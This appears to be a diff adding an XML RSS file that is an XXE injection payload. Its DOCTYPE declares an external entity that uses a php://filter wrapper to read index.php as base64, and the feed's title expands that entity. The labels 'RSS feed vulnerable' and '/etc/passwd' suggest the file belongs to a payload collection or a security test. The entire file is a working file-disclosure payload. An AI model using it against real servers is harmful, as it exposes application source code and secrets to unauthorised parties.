@@ -1,0 +1,12 @@
+<!DOCTYPE rss [
+    <!ENTITY include SYSTEM "php://filter/convert.base64-encode/resource=index.php" >
+]>
+<rss version="2.0">
+    <channel>
+        <title>RSS feed vulnerable</title>
+        <description>Content of /etc/passwd</description>
+        <item>
+            <title>&include;</title>
+        </item>
+    </channel>
+</rss>
